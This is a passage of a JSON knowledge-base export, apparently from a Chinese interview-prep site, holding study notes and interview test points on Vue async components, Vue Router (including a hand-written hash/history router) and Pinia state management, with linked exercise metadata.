    "testPoint": "### **1. 基本概念与使用方式**\n#### **问题：**\n1. 什么是 Vue 中的异步组件？你如何在 Vue 中定义异步组件？\n2. 使用异步组件有什么好处？\n\n#### **考察点：**\n- **基本概念**：\n  异步组件是一种按需加载的组件。在 Vue 中，异步组件通常是通过动态导入语法（`import()`）来实现的，只有在该组件被实际需要渲染时才会被加载。\n\n- **定义异步组件**：\n  使用 `Vue.component` 或在路由配置中通过 `component` 定义异步组件，通常是通过返回一个动态导入的 Promise 来实现：\n  ```javascript\n  const AsyncComponent = () => import('./AsyncComponent.vue');\n  ```\n\n- **示例**：\n  ```javascript\n  const AsyncComponent = () => import('./AsyncComponent.vue');\n  export default {\n    components: {\n      AsyncComponent\n    }\n  }\n  ```\n\n- **好处**：\n  - **减少首屏加载时间**：将部分不必要的组件推迟加载，有助于提升首屏渲染速度。\n  - **按需加载**：用户访问不同的页面时，只有在需要时才加载对应的组件，避免一次性加载过多内容。\n  - **提升性能**：通过懒加载大组件，减少初始加载的资源大小，提升用户体验。\n\n---\n\n### **2. 异步组件的加载过程**\n#### **问题：**\n1. Vue 中的异步组件是如何工作的？它如何实现懒加载？\n2. 在使用异步组件时，如果加载失败，Vue 会如何处理？\n\n#### **考察点：**\n- **工作原理**：\n  当页面渲染到异步组件时，Vue 会触发该组件的动态导入。这个操作是通过 `import()` 实现的，它返回一个 `Promise`，当这个 `Promise` 被解析时，组件会被加载并渲染。\n\n  ```javascript\n  const AsyncComponent = () => import('./AsyncComponent.vue');\n  ```\n\n  `import()` 返回的 `Promise` 会在加载完成后解析，解析结果就是加载的组件，Vue 会在该组件需要渲染时进行加载。\n  \n- **加载失败的处理**：\n  如果异步组件的加载失败，通常可以通过 `Promise` 的 `catch` 方法来处理错误。Vue 提供了 `error` 选项来捕获加载失败的情况，并可以展示一个备用组件或提示信息。\n\n  ```javascript\n  const AsyncComponent = () => import('./AsyncComponent.vue').catch(() => import('./ErrorComponent.vue'));\n  ```\n\n  另外，Vue 提供了 `loading` 和 `error` 属性用于处理加载过程中和加载失败时的状态：\n  ```javascript\n  const AsyncComponent = () => ({\n    component: import('./AsyncComponent.vue'),\n    loading: LoadingComponent,\n    error: ErrorComponent,\n    delay: 200,  // 延迟200ms后显示 loading 组件\n    timeout: 3000  // 超过3秒还没加载完成显示 error 组件\n  });\n  ```\n\n---\n\n### **3. 异步组件的性能优化**\n#### **问题：**\n1. 如何优化异步组件的加载性能？可以使用哪些策略？\n2. 在多个异步组件的情况下，如何确保它们高效加载？\n\n#### **考察点：**\n- **懒加载与拆分**：\n  通过按需加载和拆分大型组件，可以减少初始页面加载的资源量。例如，对于一个大页面，可以把页面拆分成多个异步组件，只有在需要渲染时才加载。\n\n- **缓存与预加载**：\n  如果你知道某个组件即将被使用，可以使用 Vue 的 `preload` 或 `prefetch` 来提前加载。`prefetch` 是一种告诉浏览器在空闲时加载资源的策略，这有助于提升组件加载的速度。\n\n  ```javascript\n  const AsyncComponent = () => ({\n    component: import('./AsyncComponent.vue'),\n    loading: LoadingComponent,\n    error: ErrorComponent,\n    delay: 200,\n    timeout: 3000,\n    prefetch: true  // 预加载\n  });\n  ```\n\n- **使用 Webpack 的代码分割**：\n  使用 Webpack 时，动态导入会自动分割代码，使得组件在需要时才会被加载到浏览器中。通过设置合理的 chunk 配置，可以更好地管理资源加载。\n\n  ```javascript\n  const AsyncComponent = () => import(/* webpackChunkName: \"async-component\" */ './AsyncComponent.vue');\n  ```\n\n  这会将该组件单独分割为一个 `async-component.js` 文件。\n\n- **异步组件与路由懒加载结合**：\n  Vue Router 支持懒加载路由组件，可以与异步组件结合，在路由切换时按需加载组件。\n  ```javascript\n  const routes = [\n    {\n      path: '/about',\n      component: () => import('./About.vue')  // 异步加载 About 组件\n    }\n  ];\n  ```\n\n---\n\n### **4. 与 Vue Router 的结合**\n#### **问题：**\n1. 在 Vue Router 中，如何使用异步组件？\n2. 路由懒加载与异步组件的关系是什么？\n\n#### **考察点：**\n- **路由懒加载**：\n  在 Vue Router 中，异步组件通常与路由懒加载一起使用。通过动态导入的方式，当用户访问某个路由时，只有相关的组件才会被加载。\n\n  ```javascript\n  const routes = [\n    {\n      path: '/home',\n      component: () => import('./Home.vue')  // 路由懒加载\n    }\n  ];\n  ```\n\n- **加载提示**：\n  可以在路由懒加载的过程中添加加载提示，常见的做法是在加载时展示一个 loading 组件，加载完成后展示目标组件。\n\n---\n\n### **5. 与其他异步机制的区别**\n#### **问题：**\n1. 异步组件和 `Promise`、`setTimeout` 等异步机制有什么区别？为什么 `import()` 会作为异步组件的实现方式？\n2. 你如何选择使用异步组件、动态导入、`Promise` 或其他异步机制？\n\n#### **考察点：**\n- **`import()` 与其他异步机制**：\n  - `import()` 是 ES6 的语法，返回一个 `Promise`，它支持模块化的按需加载，并且是静态导入的延伸。\n  - 相较于 `setTimeout` 等传统异步机制，`import()` 具有更高的语义清晰度，表示按需加载模块，并且与 JavaScript 的模块系统兼容。\n\n- **选择异步机制**：\n  - 对于大部分组件，尤其是大型应用中的部分组件，使用异步组件的方式可以显著提升页面性能。\n  - 对于一些小的、需要提前加载的组件，使用普通的同步加载即可。\n\n---\n\n### **总结**\n\n异步组件在 Vue 中是非常有用的优化工具，允许按需加载组件，从而显著提高应用性能。通过结合动态导入、Vue Router 的懒加载和合适的预加载策略，可以实现高效的资源管理和加载过程。在面试中，关于异步组件的考察通常会涉及其工作原理、加载失败处理、性能优化策略，以及与 Vue Router 的结合使用等方面。",
    "exerciseKeyList": "[\"3589263a-683a-47d2-8716-191cd1d393bf\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-05T03:08:39.000Z",
    "updateAt": "2024-12-15T12:34:04.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "3589263a-683a-47d2-8716-191cd1d393bf",
        "title": "说说你对 Vue 中异步组件的理解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2024-12-15T12:29:39.000Z",
        "updateAt": "2024-12-15T12:33:48.000Z"
      }
    ]
  },
  "82": {
    "id": 82,
    "tagId": 14,
    "title": "vue路由",
    "explanation": "从后端路由开始\n------\n\n路由这个概念最先是后端出现的。在以前用模板引擎开发页面时，经常会看到这样\n\n```\nhttp://www.xxx.com/login\n\n```\n\n大致流程可以看成这样：\n\n1.  浏览器发出请求\n    \n2.  服务器监听到80端口（或443）有请求过来，并解析url路径\n    \n3.  根据服务器的路由配置，返回相应信息（可以是 html 字串，也可以是 json 数据，图片等）\n    \n4.  浏览器根据数据包的 Content-Type 来决定如何解析数据\n    \n\n简单来说路由就是用来跟后端服务器进行交互的一种方式，通过不同的路径，来请求不同的资源，请求不同的页面是路由的其中一种功能。\n\n前端路由\n----\n\n#### 1\\. hash 模式\n\n随着 ajax 的流行，异步数据请求交互运行在不刷新浏览器的情况下进行。而异步交互体验的更高级版本就是 SPA —— 单页应用。单页应用不仅仅是在页面交互是无刷新的，连页面跳转都是无刷新的，为了实现单页应用，所以就有了前端路由。 类似于服务端路由，前端路由实现起来其实也很简单，就是匹配不同的 url 路径，进行解析，然后动态的渲染出区域 html 内容。但是这样存在一个问题，就是 url 每次变化的时候，都会造成页面的刷新。那解决问题的思路便是在改变 url 的情况下，保证页面的不刷新。在 2014 年之前，大家是通过 hash 来实现路由，url hash 就是类似于：\n\n```\nhttp://www.xxx.com/#/login\n```\n\n这种 #。后面 hash 值的变化，并不会导致浏览器向服务器发出请求，浏览器不发出请求，也就不会刷新页面。另外每次 hash 值的变化，还会触发`hashchange` 这个事件，通过这个事件我们就可以知道 hash 值发生了哪些变化。然后我们便可以监听`hashchange`来实现更新页面部分内容的操作：\n\n```javascript\nfunction matchAndUpdate () {\n   // todo 匹配 hash 做 dom 更新操作\n}\n\nwindow.addEventListener('hashchange', matchAndUpdate)\n```\n\n#### 2\\. history 模式\n\n14年后，因为HTML5标准发布。多了两个 API，`pushState` 和 `replaceState`，通过这两个 API 可以改变 url 地址且不会发送请求。同时还有`popstate` 事件。通过这些就能用另一种方式来实现前端路由了，但原理都是跟 hash 实现相同的。用了 HTML5 的实现，单页路由的 url 就不会多出一个#，变得更加美观。但因为没有 # 号，所以当用户刷新页面之类的操作时，浏览器还是会给服务器发送请求。为了避免出现这种情况，所以这个实现需要服务器的支持，需要把所有路由都重定向到根页面。\n\n```javascript\nfunction matchAndUpdate () {\n   // todo 匹配路径 做 dom 更新操作\n}\n\nwindow.addEventListener('popstate', matchAndUpdate)\n\n```\n\nVue router 实现\n-------------\n\n我们来看一下`vue-router`是如何定义的：\n\n```javascript\nimport VueRouter from 'vue-router'\nVue.use(VueRouter)\n\nconst router = new VueRouter({\n  mode: 'history',\n  routes: [...]\n})\n\nnew Vue({\n  router\n  ...\n})\n\n```\n\n可以看出来`vue-router`是通过 `Vue.use`的方法被注入进 Vue 实例中，在使用的时候我们需要全局用到 `vue-router`的`router-view`和`router-link`组件，以及`this.$router/$route`这样的实例对象。那么是如何实现这些操作的呢？\n\n\n造轮子 -- 动手实现一个数据驱动的 router\n-------------------------\n\n经过上面的阐述，相信您已经对前端路由以及`vue-router`有了一些大致的了解。那么这里我们为了贯彻无解肥，我们来手把手撸一个下面这样的数据驱动的 `router`：\n\n```javascript\nnew Router({\n  id: 'router-view', // 容器视图\n  mode: 'hash', // 模式\n  routes: [\n    {\n      path: '/',\n      name: 'home',\n      component: '<div>Home</div>',\n      beforeEnter: (next) => {\n        console.log('before enter home')\n        next()\n      },\n      afterEnter: (next) => {\n        console.log('enter home')\n        next()\n      },\n      beforeLeave: (next) => {\n        console.log('start leave home')\n        next()\n      }\n    },\n    {\n      path: '/bar',\n      name: 'bar',\n      component: '<div>Bar</div>',\n      beforeEnter: (next) => {\n        console.log('before enter bar')\n        next()\n      },\n      afterEnter: (next) => {\n        console.log('enter bar')\n        next()\n      },\n      beforeLeave: (next) => {\n        console.log('start leave bar')\n        next()\n      }\n    },\n    {\n      path: '/foo',\n      name: 'foo',\n      component: '<div>Foo</div>'\n    }\n  ]\n})\n\n```\n\n#### 思路整理\n\n首先是数据驱动，所以我们可以通过一个`route`对象来表述当前路由状态，比如：\n\n```javascript\ncurrent = {\n    path: '/', // 路径\n    query: {}, // query\n    params: {}, // params\n    name: '', // 路由名\n    fullPath: '/', // 完整路径\n    route: {} // 记录当前路由属性\n}\n\n```\n\n`current.route`内存放当前路由的配置信息，所以我们只需要监听`current.route`的变化来动态`render`页面便可。\n\n接着我么需要监听不同的路由变化，做相应的处理。以及实现`hash`和`history`模式。\n\n#### 数据驱动\n\n这里我们延用`vue`数据驱动模型，实现一个简单的数据劫持，并更新视图。首先定义我们的`observer`\n\n```javascript\nclass Observer {\n  constructor (value) {\n    this.walk(value)\n  }\n\n  walk (obj) {\n    Object.keys(obj).forEach((key) => {\n      // 如果是对象，则递归调用walk，保证每个属性都可以被defineReactive\n      if (typeof obj[key] === 'object') {\n        this.walk(obj[key])\n      }\n      defineReactive(obj, key, obj[key])\n    })\n  }\n}\n\nfunction defineReactive(obj, key, value) {\n  let dep = new Dep()\n  Object.defineProperty(obj, key, {\n    get: () => {\n      if (Dep.target) {\n        // 依赖收集\n        dep.add()\n      }\n      return value\n    },\n    set: (newValue) => {\n      value = newValue\n      // 通知更新，对应的更新视图\n      dep.notify()\n    }\n  })\n}\n\nexport function observer(value) {\n  return new Observer(value)\n}\n\n```\n\n再接着，我们需要定义`Dep`和`Watcher`:\n\n```javascript\nexport class Dep {\n  constructor () {\n    this.deppend = []\n  }\n  add () {\n    // 收集watcher\n    this.deppend.push(Dep.target)\n  }\n  notify () {\n    this.deppend.forEach((target) => {\n      // 调用watcher的更新函数\n      target.update()\n    })\n  }\n}\n\nDep.target = null\n\nexport function setTarget (target) {\n  Dep.target = target\n}\n\nexport function cleanTarget() {\n  Dep.target = null\n}\n\n// Watcher\nexport class Watcher {\n  constructor (vm, expression, callback) {\n    this.vm = vm\n    this.callbacks = []\n    this.expression = expression\n    this.callbacks.push(callback)\n    this.value = this.getVal()\n\n  }\n  getVal () {\n    setTarget(this)\n    // 触发 get 方法，完成对 watcher 的收集\n    let val = this.vm\n    this.expression.split('.').forEach((key) => {\n      val = val[key]\n    })\n    cleanTarget()\n    return val\n  }\n\n  // 更新动作\n  update () {\n    this.callbacks.forEach((cb) => {\n      cb()\n    })\n  }\n}\n\n```\n\n到这里我们实现了一个简单的订阅-发布器，所以我们需要对`current.route`做数据劫持。一旦`current.route`更新，我们可以及时的更新当前页面：\n\n```javascript\n  // 响应式数据劫持\n  observer(this.current)\n\n  // 对 current.route 对象进行依赖收集，变化时通过 render 来更新\n  new Watcher(this.current, 'route', this.render.bind(this))\n\n```\n\n恩....到这里，我们似乎已经完成了一个简单的响应式数据更新。其实`render`也就是动态的为页面指定区域渲染对应内容，这里只做一个简化版的`render`:\n\n```javascript\n  render() {\n    let i\n    if ((i = this.history.current) && (i = i.route) && (i = i.component)) {\n      document.getElementById(this.container).innerHTML = i\n    }\n  }\n\n```\n\nhash 和 history\n--------------\n\n接下来是`hash`和`history`模式的实现，这里我们可以沿用`vue-router`的思想，建立不同的处理模型便可。来看一下我实现的核心代码：\n\n```javascript\nthis.history = this.mode === 'history' ? new HTML5History(this) : new HashHistory(this)\n\n```\n\n当页面变化时，我们只需要监听`hashchange`和`popstate`事件，做路由转换`transitionTo`:\n\n```javascript\n  /**\n   * 路由转换\n   * @param target 目标路径\n   * @param cb 成功后的回调\n   */\n  transitionTo(target, cb) {\n    // 通过对比传入的 routes 获取匹配到的 targetRoute 对象\n    const targetRoute = match(target, this.router.routes)\n    this.confirmTransition(targetRoute, () => {\n      // 这里会触发视图更新\n      this.current.route = targetRoute\n      this.current.name = targetRoute.name\n      this.current.path = targetRoute.path\n      this.current.query = targetRoute.query || getQuery()\n      this.current.fullPath = getFullPath(this.current)\n      cb && cb()\n    })\n  }\n\n  /**\n   * 确认跳转\n   * @param route\n   * @param cb\n   */\n  confirmTransition (route, cb) {\n    // 钩子函数执行队列\n    let queue = [].concat(\n      this.router.beforeEach,\n      this.current.route.beforeLeave,\n      route.beforeEnter,\n      route.afterEnter\n    )\n    \n    // 通过 step 调度执行\n    let i = -1\n    const step = () => {\n      i ++\n      if (i > queue.length) {\n        cb()\n      } else if (queue[i]) {\n        queue[i](step)\n      } else {\n        step()\n      }\n\n    }\n    step(i)\n  }\n}\n\n```\n\n这样我们一方面通过`this.current.route = targetRoute`达到了对之前劫持数据的更新，来达到视图更新。另一方面我们又通过任务队列的调度，实现了基本的钩子函数`beforeEach`、`beforeLeave`、`beforeEnter`、`afterEnter`。 到这里其实也就差不多了，接下来我们顺带着实现几个API吧：\n\n```javascript\n  /**\n   * 跳转，添加历史记录\n   * @param location \n   * @example this.push({name: 'home'})\n   * @example this.push('/')\n   */\n  push (location) {\n    const targetRoute = match(location, this.router.routes)\n\n    this.transitionTo(targetRoute, () => {\n      changeUrl(this.router.base, this.current.fullPath)\n    })\n  }\n\n  /**\n   * 跳转，添加历史记录\n   * @param location\n   * @example this.replaceState({name: 'home'})\n   * @example this.replaceState('/')\n   */\n  replaceState(location) {\n    const targetRoute = match(location, this.router.routes)\n\n    this.transitionTo(targetRoute, () => {\n      changeUrl(this.router.base, this.current.fullPath, true)\n    })\n  }\n\n  go (n) {\n    window.history.go(n)\n  }\n\n  function changeUrl(path, replace) {\n    const href = window.location.href\n    const i = href.indexOf('#')\n    const base = i >= 0 ? href.slice(0, i) : href\n    if (replace) {\n      window.history.replaceState({}, '', `${base}#/${path}`)\n    } else {\n      window.history.pushState({}, '', `${base}#/${path}`)\n    }\n  }\n\n```\n\n",
    "testPoint": "### **1. 路由的基本概念**\n#### **问题：**\n1. 什么是路由？Vue Router 是如何工作的？  \n2. 什么是前端路由和后端路由的区别？\n\n#### **考察点：**\n- **路由的作用**：\n  - 根据 URL 的变化加载不同的组件或页面内容。\n  - 实现页面的导航和状态管理。\n\n- **前端路由 vs 后端路由**：\n  - **前端路由**：通过监听浏览器地址栏的变化更新视图（如 `hash` 模式或 `history` 模式）。\n  - **后端路由**：服务器根据不同的 URL 返回对应的资源。\n\n- **Vue Router 的实现**：\n  - Vue Router 是通过动态组件和 URL 监听实现页面切换的。\n\n---\n\n### **2. 路由模式**\n#### **问题：**\n1. Vue Router 支持哪些路由模式？它们的区别是什么？  \n2. 如果项目需要 SEO 优化，应该选择哪种模式？为什么？\n\n#### **考察点：**\n- **模式种类**：\n  - **`hash` 模式**：基于 `#` 的 URL，依赖 `location.hash`。不需要服务器配置，适合简单场景。\n  - **`history` 模式**：基于 HTML5 的 `history.pushState`，更符合 URL 语义，但需要服务器支持。\n  - **`abstract` 模式**：运行于无浏览器环境（如 Node.js 中）。\n\n- **SEO 相关性**：\n  - **`hash` 模式**：URL 不利于 SEO，因为爬虫无法识别 `#` 之后的内容。\n  - **`history` 模式**：URL 简洁，可被爬虫索引。\n\n---\n\n### **3. 路由配置**\n#### **问题：**\n1. 如何定义 Vue 的动态路由？什么是嵌套路由？  \n2. 路由配置中的 `name` 和 `path` 有什么区别？  \n3. 路由中的 `props` 有哪些用法？  \n\n#### **考察点：**\n- **基本配置**：\n  - 静态路由：\n    ```javascript\n    const routes = [\n      { path: '/', component: Home },\n      { path: '/about', component: About },\n    ];\n    ```\n  - 动态路由：\n    ```javascript\n    { path: '/user/:id', component: User }\n    ```\n    可通过 `$route.params.id` 获取参数。\n\n- **嵌套路由**：\n  - 子路由需要在父路由的 `children` 中配置。\n    ```javascript\n    { \n      path: '/parent', \n      component: Parent, \n      children: [\n        { path: 'child', component: Child }\n      ] \n    }\n    ```\n\n- **路由 `props`**：\n  - 静态值：\n    ```javascript\n    { path: '/user/:id', component: User, props: { staticValue: true } }\n    ```\n  - 动态解析：\n    ```javascript\n    { path: '/user/:id', component: User, props: route => ({ id: route.params.id }) }\n    ```\n\n---\n\n### **4. 导航守卫**\n#### **问题：**\n1. Vue Router 提供了哪些导航守卫？各自的应用场景是什么？  \n2. 如何实现登录拦截和权限验证？  \n3. 如何取消导航操作？  \n\n#### **考察点：**\n- **导航守卫的分类**：\n  - **全局守卫**：\n    - `beforeEach`：跳转前的全局拦截。\n    - `afterEach`：跳转后的全局回调。\n  - **路由独享守卫**：通过路由配置的 `beforeEnter`。\n  - **组件内守卫**：\n    - `beforeRouteEnter`\n    - `beforeRouteUpdate`\n    - `beforeRouteLeave`\n\n- **权限验证**：\n  - 示例：在 `beforeEach` 中检查是否登录。\n    ```javascript\n    router.beforeEach((to, from, next) => {\n      if (to.meta.requiresAuth && !isLoggedIn()) {\n        next('/login');\n      } else {\n        next();\n      }\n    });\n    ```\n\n- **取消导航**：\n  - 调用 `next(false)` 取消导航。\n\n---\n\n### **5. 路由懒加载**\n#### **问题：**\n1. 什么是路由懒加载？如何实现？  \n2. 路由懒加载有哪些优点？  \n\n#### **考察点：**\n- **实现方式**：\n  - 使用动态 `import`：\n    ```javascript\n    const routes = [\n      { \n        path: '/about', \n        component: () => import('./About.vue') \n      }\n    ];\n    ```\n\n- **优点**：\n  - 减少首屏加载时间，按需加载组件。\n  - 提高应用性能，尤其适合大型单页应用。\n\n---\n\n### **6. 动态添加与移除路由**\n#### **问题：**\n1. 如何动态添加路由？有哪些场景需要用到？  \n2. 动态添加的路由如何移除？  \n\n#### **考察点：**\n- **动态添加**：\n  - 使用 `router.addRoute`：\n    ```javascript\n    router.addRoute({\n      path: '/new',\n      component: NewComponent\n    });\n    ```\n\n- **动态移除**：\n  - Vue Router 4 提供了 `removeRoute` 方法。\n\n- **应用场景**：\n  - 根据用户权限动态加载路由。\n  - 动态模块加载（如微前端场景）。\n\n---\n\n### **7. 编程式导航**\n#### **问题：**\n1. Vue Router 中如何使用编程式导航实现页面跳转？  \n2. 如何替代当前页面而不是添加新历史记录？  \n\n#### **考察点：**\n- **基本导航**：\n  - 使用 `$router.push`：\n    ```javascript\n    this.$router.push('/home');\n    ```\n  - 使用命名路由：\n    ```javascript\n    this.$router.push({ name: 'home', params: { id: 123 } });\n    ```\n\n- **替代导航**：\n  - 使用 `$router.replace`：\n    ```javascript\n    this.$router.replace('/login');\n    ```\n\n---\n\n### **8. 滚动行为**\n#### **问题：**\n1. 如何在页面跳转时实现滚动到顶部？  \n2. 路由切换后如何保持页面滚动位置？  \n\n#### **考察点：**\n- **自定义滚动行为**：\n  - 在路由实例中配置 `scrollBehavior`：\n    ```javascript\n    const router = new VueRouter({\n      scrollBehavior(to, from, savedPosition) {\n        if (savedPosition) {\n          return savedPosition;\n        } else {\n          return { x: 0, y: 0 };\n        }\n      }\n    });\n    ```\n\n- **保持位置**：\n  - 使用 `savedPosition` 参数保存滚动位置。\n\n---\n\n### **9. 路由的生命周期与性能优化**\n#### **问题：**\n1. 路由切换时，如何管理组件的创建与销毁？  \n2. 如何避免路由组件的重复渲染？  \n\n#### **考察点：**\n- **组件复用**：\n  - 使用 `keep-alive` 缓存路由组件。\n    ```html\n    <keep-alive>\n      <router-view />\n    </keep-alive>\n    ```\n\n- **性能优化**：\n  - 优化路由懒加载，减少组件首次渲染时间。\n  - 减少复杂嵌套路由的层级。\n\n---\n\n### **10. 异常处理**\n#### **问题：**\n1. 如何处理路由中找不到的页面？  \n2. 如何统一处理路由导航过程中的错误？\n\n#### **考察点：**\n- **404 页面**：\n  - 配置通配路由：\n    ```javascript\n    { path: '*', component: NotFound }\n    ```\n\n- **错误处理**：\n  - 捕获导航错误：\n    ```javascript\n    router.onError(err => {\n      console.error('Navigation Error:', err);\n    });\n    ```",
    "exerciseKeyList": "[\"6b910440-48ae-49f9-8659-8aa880d239fb\",\"e3a135b5-e6d4-4f1f-8e02-0c977e2ce768\"]",
    "vipLimit": 1,
    "level": 2,
    "pointOrder": 1,
    "createAt": "2024-10-05T03:15:58.000Z",
    "updateAt": "2024-12-17T01:13:45.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "6b910440-48ae-49f9-8659-8aa880d239fb",
        "title": "什么是“前端路由”？什么时候适合使用“前端路由”？“前端路由”有哪些优点和缺点？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-11-17T14:22:19.000Z",
        "updateAt": "2024-08-10T17:05:59.000Z"
      },
      {
        "exerciseKey": "e3a135b5-e6d4-4f1f-8e02-0c977e2ce768",
        "title": "vue路由中，history和hash两种模式有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-05T14:16:20.000Z",
        "updateAt": "2024-08-10T17:06:28.000Z"
      }
    ]
  },
  "83": {
    "id": 83,
    "tagId": 14,
    "title": "状态管理",
    "explanation": "本知识点将以 `Pinia` 为例，介绍 Vue 中的状态管理。\n\n# 前言\n\n[Pinia](https://pinia.vuejs.org/zh/)简称小菠萝🍍，是一个专为Vue 3设计的现代化状态管理库，为`Vue 3`开发的，它提供了一种简单、可扩展和类型安全的方式来管理应用程序的状态。\n\n与`Vue 2`中的Vuex相比，`Pinia`提供了更好的`TypeScrip`t支持，具有更好的类型定义和类型推断，可在编译时捕获错误，提供更高的代码可靠性和开发体验。它是专为`Vue 3`设计的，充分利用了`Vue 3`的新特性，如`Composition API`，以提供更直接、自然和灵活的状态管理体验。`Pinia`的核心概念是`Store`，它类似于`Vuex`中的模块，用于管理应用程序的状，可以将相关的状态和逻辑组合到单个`Store`中，使代码更清晰、结构更有组织性。除此之外海提供了许多有用的特性和功能，例如模块化组织、状态持久化、插件扩展等。\n\n总的来说，`Pinia`是一个功能强大而灵活的状态管理解决方案，适用于各种规模的`Vue 3`应用程序。它提供了现代化的特性和工具，帮助我们更好地组织、管理和扩展应用程序的状态，同时提供了更好的类型安全和开发体验。\n\n# 安装\n\n运行安装命令\n\n```bash\nnpm install pinia\n```\n\n在`main.ts`中引入\n\n```ts\n// main.ts\nimport { createApp } from 'vue'\nimport { createPinia } from 'pinia'\nimport App from './App.vue'\n\nconst pinia = createPinia()\nconst app = createApp(App)\n\napp.use(pinia)\napp.mount('#app')\n```\n\n# 初始化Store\n\n新建`stores`文件，用于存放所有的`store`，然后创建`index.ts`。\n\n同过 `defineStore()` 定义一个`store`，它接受一个参数作为仓库名称，也就是`Id`。它返回一个函数，默认我们使用`user`开头的风格来接收。第二个参数为一个`Setup`函数或者`Option`对象。\n\n```ts\nimport { defineStore } from 'pinia'\n\nexport const useUsersStore = defineStore('users', {\n  // 其他配置...\n  \n})\n```\n\n## Option Store\n\n这种方式熟悉`Vuex`的很了解，传入一个带有 `state`、`actions` 与 `getters` 属性的 `Option` 对象\n\n```ts\nexport const userUsersStore = defineStore('users', {\n  state: () => {\n    return {\n      name: 'inkun',\n      current: 100\n    }\n  },\n\n  getters: {\n    getName: (state) => state.name + '🐔你好帅'\n  },\n\n  actions:{\n    getUserInfo {\n      ...\n    }\n  }\n})\n```\n\n在 `Option Store` 中：\n\n-   `state` 是 `store` 的数据 `data`\n-   `getters` 是 `store` 的计算属性 `computed`\n-   `actions` 则是方法 `methods`\n\n## Setup Store\n\n和[Vue3 Composition API](https://juejin.cn/post/7277836494298152994 \"https://juejin.cn/post/7277836494298152994\")组合式`API`里`setup`函数相似，传入一个函数，该函数定义了一些响应式属性和方法，并且返回一个带有我们想要暴露出去的属性和方法的对象。\n\n```ts\nexport const userUsersStore = defineStore('users', () => {\n  const name = ref('inkun')\n  function getInkun() {\n    getInkun.value + '🐔你好帅'\n  }\n\n  return { name, getInkun }\n})\n\n```\n\n在 `Setup Store` 中：\n\n-   `ref()` 就是 `state` 属性\n-   `computed()` 就是 `getters`\n-   `function()` 就是 `actions`\n\n## 使用Store\n\n定义一个`store`后，在组件里引入这个`store`然后就行使用，不需要像`ref`一样使用`.value`，可以直接修改访问。\n\n```ts\n<script setup lang=\"ts\">\nimport { useCounterStore } from '@/stores/counter'\n// 可以在组件中的任意位置访问 `store` 变量 ✨\n\nconst store = useCounterStore()\n</script>\n```\n\n# State\n\n`state`定义一个返回初始状态的函数，函数内返回一个对象，里面是需要定义的数据。\n\n对于基础类型而言，\\[\\[../TypeScript|TypeScript\\]\\]可以自行推断出它们的数据类型，也可以接口，定义`state`函数返回值。\n\n```ts\ninterface State {\n  userList: UserInfo[]\n  user: UserInfo | null\n}\n\ninterface UserInfo {\n  name: string\n  age: number\n}\nexport const userUsersStore = defineStore('users', {\n  state: (): State => {\n    return {\n      userList: [],\n      user: null\n    }\n  }\n})\n```\n\n## 修改State\n\n默认情况下可以直接通过`store`实例访问`state`，并且可以直接对其进行读写操作。\n\n在`Vuex`中，如果要对`state`进行修改必须要定一个`mutation`，通过`mutation`进行提交，太过于繁琐。\n\n```ts\nconst store = useStore()\n\nstore.count++\n```\n\n### 变更\n\n除了用 `store.count++` 直接改变 `store`，还可以调用 `$patch` 方法。它允许你用一个 `state` 的补丁对象在同一时间更改多个属性：\n\n```ts\nstore.$patch({\n  count: store.count + 1,\n  name: 'ff',\n})\n```\n\n### 重置\n\n可以通过调用 `store` 的 `$reset()` 方法将 `state` 重置为初始值。\n\n```ts\nconst store = useStore()\n\nstore.$reset()\n```\n\n### 监听\n\n类似于 `Vuex` 的 `subscribe` 方法，可以通过 `store` 的 `$subscribe()` 方法侦听 `state` 及其变化。\n\n```ts\nstore.$subscribe((mutation, state) => {\n\n  mutation.storeId // 'cart'\n\n  console.log('state change', state)\n  console.log('mutation', mutation.type)  // 'direct' | 'patch object' | 'patch function'\n  console.log('mutation2', mutation.storeId) // 'users'\n  // 只有 mutation.type === 'patch object'的情况下才可用\n  // mutation.payload // 传递给 cartStore.$patch() 的补丁对象。\n  console.log('mutation3', mutation.payload)\n}, {\n  detached: true\n})\n```\n\n默认情况下，`state subscription` 会被绑定到添加它们的组件上，当该组件被卸载时，它们将被自动删除。如果想在组件卸载后依旧保留它们，将 { `detached: true }` 作为第二个参数，以将 `state subscription` 从当前组件中分离，此时组件卸载后，订阅器还可以使用。\n\n## 结构State\n\n在使用`state`时是不允许直接从`store`中结构数据，这样会导致数据失去响应式和`props`一样。\n\n解构出来的数据是可以正常访问，当数据修改时是不会发生任何变化。\n\n```ts\n<script setup lang=\"ts\">\nimport { useCounterStore } from '@/stores/counter'\n\nconst {current, name} = useCounterStore() // 数据不会发生变化\n\nfunction change() {\n  store.current++\n}\n</script>\n```\n\n解决方案是通过`storeToRefs`将数据重新变回响应式。\n\n```ts\n<script setup lang=\"ts\">\nimport { useCounterStore } from '@/stores/counter'\n\nconst store= useCounterStore() // 数据不会发生变化\nconst {name, current} = storeToRefs(store)\nfunction change() {\n  store.current = 1\n  name.value = 'ff'\n}\n</script>\n```\n\n# Getter\n\n`getter`相当于计算属性，接收一个函数，函数参数为当前`store`里的`state`，也可以通过`this`去访问。\n\n```ts\nexport const userUsersStore = defineStore('users', {\n  state: () => {\n    return {\n      name: 'inkun',\n      current: 100\n    }\n  },\n\tgetUserName(state) {\n\t\treturn state.name + '🐔你好帅'\n\t},\n\tgetName(): string {\n\t\treturn this.name + '🐔你实在太帅'\n\t}\n\n})\n```\n\n然后就可以通过`store`实例访问`getter`\n\n```html\n<template>\n  {{ store.getUserName }}\n  {{ store.getName }}\n</template>\n\n<script setup lang=\"ts\">\nimport { userUsersStore } from './stores'\n\nconst store = userUsersStore()\n</script>\n```\n\n## 访问其他Getter\n\n通过`this`可以访问其他的`getter`\n\n```ts\nexport const userUsersStore = defineStore('users', {\n  state: () => {\n    return {\n      name: 'inkun',\n      current: 100\n    }\n  },\n\tgetUserName(state) {\n\t\treturn '大家好，我是' + state.name \n\t},\n\tgetName(): string {\n\t\treturn this.getUserName + '🐔你实在太帅'\n\t}\n\n})\n```\n\n## 向Getter传递参数\n\n`getter` 只是幕后的计算属性，所以不可以向它们传递任何参数。不过，可以从 `getter` 返回一个函数，该函数可以接受任意参数：\n\n```ts\nexport const 